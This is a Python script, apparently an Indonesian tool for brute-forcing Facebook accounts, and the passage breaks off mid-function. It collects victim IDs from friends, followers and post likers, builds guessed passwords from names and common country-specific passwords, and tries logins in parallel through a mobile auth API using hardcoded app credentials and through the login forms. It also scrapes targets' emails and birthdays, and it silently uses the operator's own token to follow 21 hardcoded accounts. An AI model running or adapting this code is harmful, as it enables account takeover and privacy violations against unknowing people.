#!/usr/bin/python3
#-*-coding:utf-8-*-
# RenoTZY

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def banner():
    print("""\x1b[0;37m   ___                   \n  / _ \_______              \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 3.9  │ Author  : Aang Ardiansyah-XD   \n       /  ^ \/ / // /  ^ \   │ Contact : 089524163441   \n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")

host="https://mbasic.facebook.com"
ok = []
cp = []
ttl =[]
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
durasi = str(datetime.now().strftime("%d/%m/%Y"))
tahun = current.year
bulan = current.month
hari = current.day

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

def country():
    os.system("clear")
    banner()
    print("\n%s[%s Pilih Negara %s]\n"%(k,p,k))
    print("%s[%s01%s] %sIndonesia (Warga +62)"%(k,p,k,p))
    print("%s[%s02%s] %sAca Aca (India)"%(k,p,k,p))
    print("%s[%s03%s] %sPakistan (Perang Tros)"%(k,p,k,p))
    print("%s[%s04%s] %sUSA (Negara Lord Jordi)"%(k,p,k,p))
    choose_country()
    
def choose_country():
    cc = input("\n%s[%s•%s] %sPilih : "%(k,p,k,p))
    if cc in[""]:
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    elif cc in["1","01"]:
        os.system("rm -rf country.txt")
        cou = "id"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["2","02"]:
        os.system("rm -rf country.txt")
        cou = "bd"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["3","03"]:
        os.system("rm -rf country.txt")
        cou = "pk"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["4","04"]:
        os.system("rm -rf country.txt")
        cou = "us"
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    elif cc in["0","00"]:
        os.system("rm -rf country.txt")
        cou = " "
        try:
            ctry = open('country.txt','w')
            ctry.write(cou)
            ctry.close()
            menu()
        except (KeyError, IOError):
            menu()
    else:
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))

### Metode Login ###

def logs():
  os.system("clear")
  banner()
  print((k+"\n["+p+"01"+k+"]"+p+" Login Pakai Token"))
  print((k+"["+p+"02"+k+"]"+p+" Login Pakai Cookies"))
  print((k+"["+p+"00"+k+"]"+p+" Keluar (Ahh Ngecrot)"))
  sek=input(k+"\n["+p+"•"+k+"]"+p+" Pilih : ")
  if sek=="":
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()
  elif sek=="1":
    defaultua()
    log_token()
  elif sek=="2":
    defaultua()
    gen()
  elif sek=="0":
    exit()
  else:
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()

def log_token():
    os.system("clear")
    banner()
    toket = input(k+"\n["+p+"?"+k+"]"+p+" Token nya ngab : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Berhasil masuk, sabar tod..."))
        bot_follow()
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Invalid Kentod!!"))
        os.system("clear")
        logs()

def gen():
        os.system("clear")
        banner()
        cookie = input(k+"\n["+p+"?"+k+"]"+p+" Cookies nya ngab : ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((k+"["+p+"!"+k+"]"+p+" No Connection"))
        except [KeyError,IOError]:
            print((k+"["+p+"!"+k+"]"+p+" Cookies Invalid Kentod!!"))
            os.system("clear")
            logs()
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Berhasil masuk, sabar tod..."))
        bot_follow()

### BOT FOLLOW ### Jangan Diganti Anjing !!!

def bot_follow():
	try:
		toket=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid Kentod!!"))
		logs()
	jalan("%s[%s•%s] %sSabar tod, sedang masuk..."%(k,p,k,p))
	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      # Dapunta Khurayra X
	requests.post("https://graph.facebook.com/1673250723/subscribers?access_token=" + toket)      # Dapunta Ratya
	requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + toket) # Almira Gabrielle X
	requests.post("https://graph.facebook.com/100001617352620/subscribers?access_token=" + toket) # Antonius Raditya M
	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) # Abigaille Dirgantara
	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       # Boirah
	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) # Anita Zuliatin
	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) # Dapunta Xayonara
	requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + toket) # Dapunta Adya R
	requests.post("https://graph.facebook.com/1676993425/subscribers?access_token=" + toket)      # Wati Waningsih
	requests.post("https://graph.facebook.com/1767051257/subscribers?access_token=" + toket)      # Rofi Nurhanifah
	requests.post("https://graph.facebook.com/100000287398094/subscribers?access_token=" + toket) # Diah Ayu Kharisma
	requests.post("https://graph.facebook.com/100001085079906/subscribers?access_token=" + toket) # Xena Alexander
	requests.post("https://graph.facebook.com/100007559713883/subscribers?access_token=" + toket) # Alexandra Scarlett
	requests.post("https://graph.facebook.com/100000424033832/subscribers?access_token=" + toket) # Pebrima Jun Helmi
	requests.post("https://graph.facebook.com/100004655733027/subscribers?access_token=" + toket) # Aisya Asyaqila
	requests.post("https://graph.facebook.com/100000200420913/subscribers?access_token=" + toket) # Ameiliani Dethasia
	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) # Muh Rizal Fiansyah
	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) # Rizal F
	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) # Angga Kurniawan
	requests.post("https://graph.facebook.com/100005395413800/subscribers?access_token=" + toket) # Moh Yayan
	menu()

### MAIN MENU ###

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    ngr = open('country.txt', 'r').read()
    if "id" in ngr:
        negara = "Indonesia slur"
    elif "bd" in ngr:
        negara = "Prindapan/India"
    elif "pk" in ngr:
        negara = "Pakistan"
    elif "us" in ngr:
        negara = "USA"
    elif " " in ngr:
        negara = "None"
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Selamat Datangatang "+a["name"]+k+" ]"+p))
    print((k+"\n["+p+"+"+k+"]"+p+" ID KAMU : "+id))
    print((k+"["+p+"+"+k+"]"+p+" IP KAMU : "+ip))
    print((k+"["+p+"+"+k+"]"+p+" Status  : "+m+"Jomblo"+p))
    print((k+"["+p+"+"+k+"]"+p+" Joined  : "+durasi))
    print((k+"["+p+"+"+k+"]"+p+" Crack   : "+negara))
    print((k+"\n["+p+"01"+k+"]"+p+" Crack ID Fari Publik/Followers"))
    print((k+"["+p+"02"+k+"]"+p+" Crack ID Dari Followers"))
    print((k+"["+p+"03"+k+"]"+p+" Crack ID Drom Like Postingan"))
    print((k+"["+p+"04"+k+"]"+p+" Crack Melalui Nomor Telepon"))
    print((k+"["+p+"05"+k+"]"+p+" Crack Melalui Email"))
    print((k+"["+p+"06"+k+"]"+p+" Ambil Data Target"))
    print((k+"["+p+"07"+k+"]"+p+" Lihat Hasil Crack"))
    print((k+"["+p+"08"+k+"]"+p+" Cek User Agent"))
    print((k+"["+p+"00"+k+"]"+p+" Keluar (Ahh Ngecrot)"))
    choose_menu()

def choose_menu():
	r=input(k+"\n["+p+"•"+k+"]"+p+" Pilih : ")
	if r=="":
		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
		menu()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		likers()
	elif r=="4":
		random_numbers()
	elif r=="5":
		random_email()
	elif r=="6":
		target()
	elif r=="7":
		ress()
	elif r=="8":
		menu_user_agent()
	elif r=="0":
		try:
			jalan(k+"\n["+p+"+"+k+"]"+p+" Mantap Tod...")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((k+"["+p+"!"+k+"]"+p+" Error %s"%e))
	else:
		print((k+"["+p+"!"+k+"]"+p+" Isi Yang Bener Kentod!!"))
		menu()	

def pilihcrack(file):
  print((k+"\n["+p+"01"+k+"]"+p+" Api ("+k+"Cepat Tapi Gampang Kena Spam"+p+")"))
  print((k+"["+p+"02"+k+"]"+p+" Api + TTL ("+k+"Cepat + TTL "+p+")"))
  print((k+"["+p+"03"+k+"]"+p+" Mbasic ("+k+"Lambat Gak Gampang Kena Spam"+p+")"))
  print((k+"["+p+"04"+k+"]"+p+" Mbasic + TTL ("+k+"Lambat + TTL"+p+")"))
  print((k+"["+p+"05"+k+"]"+p+" Free Facebook ("+k+"Sangat Lambat Kemungkinan OK 80%"+p+")"))
  krah=input(k+"\n["+p+"•"+k+"]"+p+" Pilih : ")
  if krah in[""]:
    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
    pilihcrack(file)
  elif krah in["1","01"]:
    bapi(file)
  elif krah in["2","02"]:
    bapittl(file)
  elif krah in["3","03"]:
    crack(file)
  elif krah in["4","04"]:
    crackttl(file)
  elif krah in["5","05"]:
    crackffb(file)
  else:
    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
    pilihcrack(file)

### DUMP ID ###

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid Kentod"))
		os.system("rm -rf login.txt")
		logs()
	try:
		print((k+"\n["+p+"+"+k+"]"+p+" Ketik \'me\' Untuk Mengambil ID Teman"))
		idt = input(k+"["+p+"?"+k+"]"+p+" ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"?"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Tidak Ada Kentod"))
			print((k+"\n[ "+p+"Kembali"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"+"+k+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid Kentod!!"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(k+"\n["+p+"?"+k+"]"+p+" Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"?"+k+"]"+p+" Nama : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Tidak Ada Kentod!!"))
			print((k+"\n[ "+p+"Kembali"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"+"+k+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

def likers():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid Kentod!!"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(k+"\n["+p+"?"+k+"]"+p+" ID Postingan Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"?"+k+"]"+p+" Nama : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Tidak Ada Kentod!!"))
			print((k+"\n[ "+p+"Kembali"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"+"+k+"]"+p+" Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

### CRACK EMAIL & PHONE ###

def random_numbers():
  data = []
  print((k+"\n["+p+"•"+k+"]"+p+" Nomor Harus 5 Digit"))
  print((k+"["+p+"•"+k+"]"+p+" Contoh : 92037"))
  kode=str(input(k+"["+p+"•"+k+"]"+p+" Masukan Nomor : "))
  exit((k+"\n["+p+"!"+k+"]"+p+" Nomor Harus 5 Digit")) if len(kode) < 5 else ''
  exit((k+"\n["+p+"!"+k+"]"+p+" Nomor Harus 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(k+"["+p+"+"+k+"]"+p+" Jumlah : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(k+"\n["+p+"¢"+k+"]"+p+" Crack Berjalan Tunggu Tod...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
  menu()

def random_email():
  data = []
  nama=input(k+"\n["+p+"•"+k+"]"+p+" Target Name : ")
  domain=input(k+"["+p+"•"+k+"]"+p+" Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit((k+"["+p+"!"+k+"]"+p+" Isi Yang Benar!!")) if not domain in ['g','y','h'] else ''
  jml=int(input(k+"["+p+"+"+k+"]"+p+" Jumlah : "))
  setpw=input(k+"["+p+"+"+k+"]"+p+" Masukan Kata Sandi : ").split(',')
  print(k+"\n["+p+"¢"+k+"]"+p+" Crack Berjalan, Tunggu Tod...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
  menu()

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
        break
  except: pass

### INFO ACCOUNT ###

def target():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid Kentod!!"))
		os.system("rm -rf login.txt")
		login()
	try:
		idt = input(k+"\n["+p+"?"+k+"]"+p+" ID Target        : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"+"+k+"]"+p+" Nama Akun     : "+op["name"]))
			print((k+"["+p+"+"+k+"]"+p+" Username         : "+op["username"]))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"+"+k+"]"+p+" Email            : "+op["email"]))
			except KeyError:
				print((k+"["+p+"+"+k+"]"+p+" Email            : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"+"+k+"]"+p+" Tanggal Lahir    : "+op["birthday"]))
			except KeyError:
				print((k+"["+p+"+"+k+"]"+p+" Tanggal Lahir    : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Gender           : "+op["gender"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Gender           : -"))
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op["first_name"]+".json").replace(" ","_")
				ys = open(qq , "w")
				for i in z["data"]:
					id.append(i["id"])
					ys.write(i["id"])
				ys.close()
				print((k+"["+p+"+"+k+"]"+p+" Total Teman     : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"+"+k+"]"+p+" Total Teman     : -"))
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op["first_name"]+".json").replace(" ","_")
				jw = open(bb , "w")
				for c in b["data"]:
					id.append(c["id"])
					jw.write(c["id"])
				jw.close()
				print((k+"["+p+"+"+k+"]"+p+" Total Follower   : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"+"+k+"]"+p+" Total Follower   : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"+"+k+"]"+p+" Website          : "+op["website"]))
			except KeyError:
				print((k+"["+p+"+"+k+"]"+p+" Website          : -"))
			except IOError:
				print((k+"["+p+"+"+k+"]"+p+" Website          : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"+"+k+"]"+p+" Waktu Update      : "+op["updated_time"]))
			except KeyError:
				print((k+"["+p+"+"+k+"]"+p+" Waktu Update      : -"))
			except IOError:
				print((k+"["+p+"+"+k+"]"+p+" Waktu Update      : -"))
			input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
			menu()
		except KeyError:
			input(k+"\n[ "+p+"Kembali"+k+" ]"+p)
			menu()
	except Exception as e:
		exit(k+"["+p+"•"+k+"]"+p+" Error : %s"%e)

### PASSWORD ###

def generate(text):
	results=[]
	ct = open('country.txt', 'r').read()
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
				if "id" in ct:
					results.append("sayang")
					results.append("bismillah")
					results.append("anjing")
					results.append("123456")
				elif "bd" in ct:
					results.append("786786")
					results.append("000786")
					results.append("102030")
					results.append("556677")
				elif "pk" in ct:
					results.append("pakistan")
					results.append("786786")
					results.append("000786")
				elif "us" in ct:
					results.append("123456")
					results.append("qwerty")
					results.append("iloveyou")
					results.append("passwords")
	return results

### USER AGENT ###

def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError, IOError):
        logs()

def menu_user_agent():
    print("\n%s[%s01%s] %sGet User Agent"%(k,p,k,p))
    print("%s[%s02%s] %sUbah User Agent"%(k,p,k,p))
    print("%s[%s03%s] %sHapus User Agent"%(k,p,k,p))
    print("%s[%s04%s] %sCek User Agent"%(k,p,k,p))
    print("%s[%s00%s] %sKembali"%(k,p,k,p))
    pilih_menu_user_agent()

def pilih_menu_user_agent():
    pmu = input("\n%s[%s•%s] %sPilih : "%(k,p,k,p))
    if pmu in[""]:
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    elif pmu in["1","01"]:
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        input(k+"\n[ "+p+"Back"+k+" ]"+p)
        menu()
    elif pmu in["2","02"]:
        change_ugent()
    elif pmu in["3","03"]:
        os.system("rm -rf ugent.txt")
        print("\n%s[%s!%s] %sUser Agent Was Removed"%(k,p,k,p))
        input(k+"\n[ "+p+"Back"+k+" ]"+p)
        menu()
    elif pmu in["4","04"]:
        check_ugent()
    elif pmu in["0","00"]:
        menu()
    else:
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))

def change_ugent():
    os.system("rm -rf ugent.txt")
    ua = input("\n%s[%s•%s] %sInput User Agent : \n\n%s"%(k,p,k,p,h))
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
        jalan("\n%s[%s•%s] %sSuccess Changed User Agent"%(h,p,h,p))
        input(k+"\n[ "+p+"Back"+k+" ]"+p)
        menu()
    except (KeyError, IOError):
        jalan("\n%s[%s•%s] %sFailed To Change User Agent"%(m,p,m,p))
        input(k+"\n[ "+p+"Back"+k+" ]"+p)
        menu()

def check_ugent():
    try:
        ungser = open('ugent.txt', 'r').read()
    except IOError:
        ungser = ("%s[%s!%s] %sUser Agent Not Found"%(k,p,k,p))
    except:pass
    print ("\n%s[%s•%s] %sYour User Agent : \n\n%s%s"%(k,p,k,p,h,ungser))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

### BRUTE CRACK ###

def mbasic(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	ua = open('ugent.txt', 'r').read()
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
